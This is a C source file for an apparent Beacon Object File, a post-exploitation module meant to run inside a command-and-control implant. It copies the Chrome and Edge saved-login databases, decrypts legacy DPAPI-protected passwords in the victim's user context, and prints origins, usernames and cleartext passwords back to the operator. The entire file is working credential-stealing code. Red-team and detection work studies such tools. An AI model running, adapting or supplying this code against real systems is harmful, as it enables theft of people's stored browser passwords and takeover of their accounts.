/*
 * bof-chromecreds [chrome|edge|all]
 *
 * Read saved logins from the Chrome / Edge `Login Data` SQLite database.
 * Prints origin, username and password.  Legacy DPAPI-protected blobs
 * (pre-v80) are decrypted in the current user context; modern `v10` blobs
 * are AES-GCM protected with a key in `Local State` and are reported as
 * encrypted (use a full Chrome credential extractor for those).
 *
 * The database is copied to %TEMP% first so locked files do not matter.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "sqlite.h"

#define BOF_CHROME_PATH_MAX 512

static void val_str(bof_sqlite_value *v, char *out, int outsz)
{
    out[0] = 0;
    if (!v || v->type != 3 || v->len <= 0) return;
    if (v->len >= outsz) {
        bof_memcpy(out, v->text, (unsigned int)outsz - 1);
        out[outsz - 1] = 0;
    } else {
        bof_memcpy(out, v->text, (unsigned int)v->len);
        out[v->len] = 0;
    }
}

static void print_blob_password(const unsigned char *p, int n)
{
    DATA_BLOB in, out;
    LPWSTR desc = NULL;

    if (!p || n <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <empty>\n");
        return;
    }
    if (n >= 3 && p[0] == 'v' && p[1] == '1' && (p[2] == '0' || p[2] == '1')) {
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <v%c%c AES-GCM, needs Local State key>\n",
                     p[1], p[2]);
        return;
    }

    in.pbData = (BYTE *)p;
    in.cbData = (DWORD)n;
    bof_memzero(&out, sizeof(out));
    if (!CRYPT32$CryptUnprotectData(&in, &desc, NULL, NULL, NULL, 0, &out)) {
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <dpapi failed: %lu>\n",
                     (unsigned long)KERNEL32$GetLastError());
        if (desc) KERNEL32$LocalFree(desc);
        return;
    }

    if ((out.cbData % 2) == 0) {
        char pw[1024];
        wchar_t wbuf[512];
        int chars = (int)(out.cbData / 2);
        if (chars > 511) chars = 511;
        bof_memcpy(wbuf, out.pbData, (unsigned int)chars * 2);
        wbuf[chars] = 0;
        bof_w2a(wbuf, pw, sizeof(pw));
        BeaconPrintf(CALLBACK_OUTPUT, "  password: %s\n", pw);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <binary %lu bytes>\n",
                     (unsigned long)out.cbData);
    }
    if (out.pbData) {
        bof_memzero(out.pbData, out.cbData);
        KERNEL32$LocalFree(out.pbData);
    }
}

static int login_row(void *ctx, int ncols, bof_sqlite_value *v)
{
    int *shown = (int *)ctx;
    char origin[512], user[256];

    if (ncols < 6) return 0;
    val_str(&v[0], origin, sizeof(origin));
    val_str(&v[3], user, sizeof(user));
    if (!origin[0] && !user[0]) return 0;
    if (v[5].type == 1 && v[5].i != 0) return 0;   /* blacklisted entry */

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n  user    : %s\n", origin, user);
    if (v[5].type == 4)
        print_blob_password(v[5].blob, v[5].len);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <none saved>\n");
    (*shown)++;
    return 0;
}

static void dump_browser(const char *label, const char *dbpath)
{
    char tmp[MAX_PATH + 64], db[MAX_PATH];
    bof_sqlite_db sdb;
    unsigned int root;
    int shown = 0;

    bof_strncpy(db, dbpath, sizeof(db));
    if (db[0] == 0) return;

    KERNEL32$GetTempPathA(sizeof(tmp), tmp);
    bof_strncat(tmp, "bof_logindata.db", sizeof(tmp) - bof_strlen(tmp) - 1);
    KERNEL32$DeleteFileA(tmp);

    if (!KERNEL32$CopyFileA(db, tmp, FALSE)) {
        /* Fall back to opening in place if the copy is denied. */
        if (bof_sqlite_open(&sdb, db) != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  %s: database not found or unreadable\n", label);
            return;
        }
    } else if (bof_sqlite_open(&sdb, tmp) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: not a SQLite database\n", label);
        KERNEL32$DeleteFileA(tmp);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s ===\n", label);
    root = bof_sqlite_table_root(&sdb, "logins");
    if (!root) {
        BeaconPrintf(CALLBACK_OUTPUT, "  no saved logins\n");
    } else {
        bof_sqlite_scan(&sdb, root, login_row, &shown);
        BeaconPrintf(CALLBACK_OUTPUT, "\n  %d login(s)\n", shown);
    }

    bof_sqlite_close(&sdb);
    KERNEL32$DeleteFileA(tmp);
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "";
    int mlen = 0;
    char path[BOF_CHROME_PATH_MAX];
    int do_chrome, do_edge;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (!mode) mode = "";

    do_chrome = (!mode[0] || bof_stricmp(mode, "chrome") == 0 ||
                 bof_stricmp(mode, "all") == 0);
    do_edge   = (!mode[0] || bof_stricmp(mode, "edge") == 0 ||
                 bof_stricmp(mode, "all") == 0);
    if (!do_chrome && !do_edge) {
        BeaconPrintf(CALLBACK_ERROR, "usage: chromecreds [chrome|edge|all]\n");
        return;
    }

    if (do_chrome) {
        path[0] = 0;
        if (KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                path, sizeof(path)))
            dump_browser("Chrome", path);
    }
    if (do_edge) {
        path[0] = 0;
        if (KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                path, sizeof(path)))
            dump_browser("Edge", path);
    }
}
